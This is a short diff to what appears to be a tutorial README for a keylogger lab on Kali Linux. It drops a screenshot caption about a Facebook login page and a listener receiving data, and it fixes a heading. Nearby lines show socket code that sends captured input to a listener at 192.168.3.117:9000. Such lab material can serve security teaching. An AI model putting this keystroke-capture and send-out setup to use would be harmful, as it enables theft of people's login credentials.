@@ -95,7 +95,6 @@ On Kali Linux, the following command is used:
 
 **Step 5 — Testing the Keylogger in a Browser**
 
-🖼️ Screenshot: Facebook login page + Kali listener receiving data
 <img width="959" height="563" alt="Screenshot 2025-11-24 142157" src="https://github.com/user-attachments/assets/474bc3f4-52ca-4485-8d78-0a7af3235e04" />
 
 
@@ -119,7 +118,7 @@ On Kali Linux, the following command is used:
 
 **6. Code Explanation (High Level)**
 
-* **✔ 1. Server Connection
+* **✔ 1. Server Connection**
 serverAddress = ('192.168.3.117', 9000)
 clientSocket.connect(serverAddress)
 
